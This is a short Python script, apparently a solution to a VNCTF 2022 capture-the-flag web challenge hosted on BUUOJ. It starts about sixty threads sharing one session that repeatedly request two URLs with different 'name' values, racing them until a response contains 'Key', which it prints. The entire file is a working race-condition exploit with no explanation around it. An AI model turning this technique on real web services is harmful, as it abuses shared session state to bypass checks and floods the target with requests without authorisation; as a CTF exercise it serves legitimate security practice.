import requests
import threading

url1 = 'http://a8776f27-7504-45c5-8396-36a037a139a7.node4.buuoj.cn:81/evi1?name=vnctf2022'
url2 = 'http://a8776f27-7504-45c5-8396-36a037a139a7.node4.buuoj.cn:81/evi1?name=vnctf2021'

def one(session):
    while event.isSet():
        res = session.get(url=url1).text
        if 'Key' in res:
            print(res)
            event.clear()

def two(session):
    while event.isSet():
        res = session.get(url=url2).text
        if 'Key' in res:
            print(res)
            event.clear()

if __name__ == '__main__':
    event = threading.Event()
    event.set()
    session = requests.session()
    session.trust_env = False
    for i in range(1, 30):
        threading.Thread(target=one, args=(session,)).start()
    for i in range(1, 30):
        threading.Thread(target=two, args=(session,)).start()